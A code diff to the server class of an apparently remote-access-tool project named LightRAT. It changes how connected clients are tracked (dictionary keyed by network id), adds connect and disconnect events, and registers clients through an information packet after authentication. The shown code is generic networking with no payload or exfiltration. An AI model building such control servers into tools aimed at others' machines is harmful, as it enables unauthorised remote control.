@@ -4,7 +4,6 @@ using System.Net;
 using System.Net.Sockets;
 using LightRAT.Data;
 using System.Collections.Generic;
-using LightRAT.Network.EventArgs;
 using LightRAT.Network.Packets;
 
 namespace LightRAT.Network
@@ -13,13 +12,14 @@ namespace LightRAT.Network
     {
         public IPEndPoint ServerEndPoint { get; set; }
         public Socket InternalSocket { get; } = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-        public ConcurrentBag<Client> ConnectedClients { get; private set; } 
-                                                      = new ConcurrentBag<Client>();
+        public ConcurrentDictionary<string, Client> ConnectedClients { get; private set; } 
+                                                                     = new ConcurrentDictionary<string, Client>();
         public List<Account> AllowedAccounts { get; private set; } = new List<Account>();
         public bool IsDisposed { get; private set; }
 
         public event EventHandler<ReceivePacketArgs> OnClientPacketReceive;
-        public event EventHandler OnClientDisconnect;
+        public event EventHandler<ClientStateChangeArgs> OnClientDisconnect;
+        public event EventHandler<ClientStateChangeArgs> OnClientConnect;
 
         public Server(string ip, int port, Account account)
         {
@@ -54,29 +54,50 @@ namespace LightRAT.Network
         {
             client.OnPacketReceive += Client_OnPacketReceive;
             client.OnDisconnect += Client_OnDisconnect;
-            ConnectedClients.Add(client);
+            ConnectedClients.TryAdd(client.NetworkId, client);
+            OnClientConnect?.Invoke(this, new ClientStateChangeArgs(client.NetworkId, client));
         }
         public void RemoveClient(Client client)
         {
             client.OnPacketReceive -= Client_OnPacketReceive;
             client.OnDisconnect -= Client_OnDisconnect;
-            ConnectedClients.TryTake(out client);
+
+            // if the client was added we will remove it
+            if (client.NetworkId != null)
+            {
+                ConnectedClients.TryRemove(client.NetworkId, out client);
+                OnClientDisconnect?.Invoke(this, new ClientStateChangeArgs(client.NetworkId, client));
+            }
+
             client.Dispose();
         }
 
         private void Client_OnPacketReceive(object sender, ReceivePacketArgs e)
         {
+            var client = (Client)sender;
             if (e.Packet is AuthenticationPacket)
             {
-                var account = ((AuthenticationPacket) e.Packet).Account;
+                var account = ((AuthenticationPacket)e.Packet).Account;
 
                 if (AllowedAccounts.Contains(account))
-                    AddClient((Client) sender);
+                {
+                    IPacket packet = new InformationPacket();
+                    packet.Execute(client);
+                }
                 else
-                    RemoveClient((Client) sender);
+                {
+                    RemoveClient(client);
+                }
+            }
+            else if (e.Packet is InformationPacket)
+            {
+                var info = ((InformationPacket)e.Packet);
+                client.NetworkId = info.NetworkId;
+                AddClient(client);
+                OnClientConnect?.Invoke(this, new ClientStateChangeArgs(client.NetworkId, client, info));
             }
             else
-                OnClientPacketReceive(this, e);
+                OnClientPacketReceive?.Invoke(this, e);
         }
         private void Client_OnDisconnect(object sender, System.EventArgs e) => RemoveClient((Client)sender);
 
@@ -90,7 +111,7 @@ namespace LightRAT.Network
                 InternalSocket.Dispose();
 
                 foreach (var client in ConnectedClients)
-                    RemoveClient(client);
+                    RemoveClient(client.Value);
 
                 AllowedAccounts.RemoveRange(0, AllowedAccounts.Count);
 
